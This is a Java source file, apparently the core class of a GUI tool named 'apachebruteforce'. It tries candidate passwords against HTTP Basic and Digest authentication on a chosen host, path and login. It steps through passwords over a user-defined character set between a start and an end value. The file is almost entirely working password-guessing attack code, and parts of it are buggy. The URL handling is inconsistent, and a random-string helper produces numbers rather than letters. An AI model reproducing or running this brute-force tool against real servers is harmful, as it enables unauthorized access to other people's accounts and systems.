package com.apachebruteforce.core;

import com.apachebruteforce.gui.MainWindow;
import org.apache.http.*;
import org.apache.http.auth.*;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.auth.DigestScheme;
import org.apache.http.impl.client.*;
import org.apache.http.util.EntityUtils;


import java.io.IOException;
import java.net.HttpURLConnection;
import java.util.Random;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Brute {
    private static Brute bruteInstance;
    private HttpURLConnection connection;
    private MainWindow window;
    private String resultPass;

    //todo I think this should be inside AuthThread , and  nonAuthRequest and other func should can see this variables
    private String uri;
    private String host;
    private String login;
    private int port;

    public void setResult(String pass) {
        window.setResultPass(pass);
    }


    public void updateData() {
        uri = window.getUri();
        host = window.getHost();
        login = window.getLogin();
        port = Integer.parseInt(window.getPort());

        Data.getInitInstance().updateData(window.getStartPassword(), window.getEndPassword());
    }

    private Brute(MainWindow window){
        this.window = window;
        resultPass = "Password not found";
    }

    public synchronized void setResultPass(String resultPass) {
        this.resultPass = resultPass;
    }

    public static Brute getBruteInstance(MainWindow window) {
        if(bruteInstance == null) {
            bruteInstance = new Brute(window);
        }

        return bruteInstance;
    }

    public static Brute getInitInstance() {
        return bruteInstance;
    }

    //return request status code
    public int nonAuthRequest() throws IOException {
        try(CloseableHttpClient client = HttpClientBuilder.create().build())
        {
            HttpGet request = new HttpGet("http://" +  host + uri);
            HttpResponse response = client.execute(request);

            BufferedReader bufReader = new BufferedReader(new InputStreamReader(
                    response.getEntity().getContent()));

            StringBuilder builder = new StringBuilder();

            String line;

            while ((line = bufReader.readLine()) != null) {
                builder.append(line);
                builder.append(System.lineSeparator());
            }

            builder.append(response.getStatusLine().getStatusCode());
            window.logTextArea.append(builder.toString());
            return  response.getStatusLine().getStatusCode();
        } catch (IOException e) {
            System.out.println("Problems with client creation");
            return -1;
        }
    }

    public int authRequest(String pass) throws Exception {

        CredentialsProvider credsProvider = new BasicCredentialsProvider();
        credsProvider.setCredentials(
                new AuthScope(host , port),
                new UsernamePasswordCredentials(login , pass));
        CloseableHttpClient httpClient = HttpClients.custom().setDefaultCredentialsProvider(credsProvider).build();
        int responseCode = 0;
        try{
            HttpGet httpget = new HttpGet(host + uri);
            System.out.println("Executing request " + httpget.getRequestLine());
            try (CloseableHttpResponse response = httpClient.execute(httpget)) {
                responseCode = response.getStatusLine().getStatusCode();
                System.out.println("----------------------------------------");
                System.out.println(response.getStatusLine());
                System.out.println(EntityUtils.toString(response.getEntity()));
                System.out.println(response.getStatusLine().getProtocolVersion());
                System.out.println(response.getStatusLine().getClass());
                System.out.println(response.getStatusLine().getReasonPhrase());
            }
        }finally {
            httpClient.close();
        }
        return  responseCode;
    }

    public int authDigRequest(String pass) throws Exception {
        CloseableHttpClient httpclient = HttpClientBuilder.create().build();
        CloseableHttpClient httpclient2 = HttpClientBuilder.create().build();
        HttpGet httpget = new HttpGet("http://" + host + uri);
        System.out.println("Requesting : " + httpget.getURI());
        int responseCode = 0;
        try {
            //Initial request without credentials returns "HTTP/1.1 401 Unauthorized"
            HttpResponse response = httpclient.execute(httpget);
            System.out.println(response.getStatusLine());

            if (response.getStatusLine().getStatusCode() == HttpStatus.SC_UNAUTHORIZED) {

                //Get current current "WWW-Authenticate" header from response
                // WWW-Authenticate:Digest realm="My Test Realm", qop="auth",
                //nonce="cdcf6cbe6ee17ae0790ed399935997e8", opaque="ae40d7c8ca6a35af15460d352be5e71c"
                Header authHeader = response.getFirstHeader(AUTH.WWW_AUTH);
                System.out.println("authHeader = " + authHeader);

                DigestScheme digestScheme = new DigestScheme();

                //Parse realm, nonce sent by server.
                digestScheme.processChallenge(authHeader);

                UsernamePasswordCredentials creds = new UsernamePasswordCredentials(login, pass);
                httpget.addHeader(digestScheme.authenticate(creds, httpget , null));

                CloseableHttpResponse response2 = httpclient2.execute(httpget);
                System.out.println(EntityUtils.toString(response2.getEntity()));
                responseCode = response2.getStatusLine().getStatusCode();
            }
        } catch (MalformedChallengeException | AuthenticationException e) {
            e.printStackTrace();
        } finally {
            httpclient.close();
            httpclient2.close();
        }
        return responseCode;
    }

    String nextPass(String s) {
        StringBuilder str = new StringBuilder();
        String tSymbols = window.getTextArea().getText();
        boolean f = true;

        for(var i = s.length() - 1; i >= 0; --i){
            if(f) {
                if(s.charAt(i) == tSymbols.charAt(tSymbols.length() - 1)) {
                    str.append(tSymbols.charAt(0));
                } else {
                    int p = tSymbols.indexOf(s.charAt(i));
                    str.append(tSymbols.charAt(p + 1));
                    f = false;
                }
            } else {
                str.append(s.charAt(i));
            }
        }

        if(f){
            str.append(tSymbols.charAt(0));
        }

        return str.toString();
    }

    private String RandomString(int size) {
        StringBuilder str = new StringBuilder();
        Random random = new Random();

        for(var i = 0; i < size; i++) {
            str.append((int) Math.floor(26 * random.nextDouble() + 65)); //maybe it's work
        }

        return str.toString();
    }
}